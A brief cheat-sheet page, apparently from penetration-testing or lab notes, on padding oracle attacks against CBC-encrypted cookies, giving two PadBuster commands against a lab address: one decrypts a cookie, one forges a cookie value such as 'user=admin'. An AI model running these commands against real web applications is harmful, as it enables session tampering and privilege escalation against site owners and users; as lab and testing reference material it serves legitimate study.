---
title: "Padding Oracle"
date: 2024-6-27
tags: ["padding oracle", "padbuster", "aes", "cbc", "cipher", "encryption"]
---

---
### padbuster

[Download padbuster](https://github.com/AonCyberLabs/PadBuster)

```bash
# 8 or 16     : block size
# encoding 0  : base64
padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0
```

```bash
# Forge cookie value, e.g. user=admin
padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
```

<br>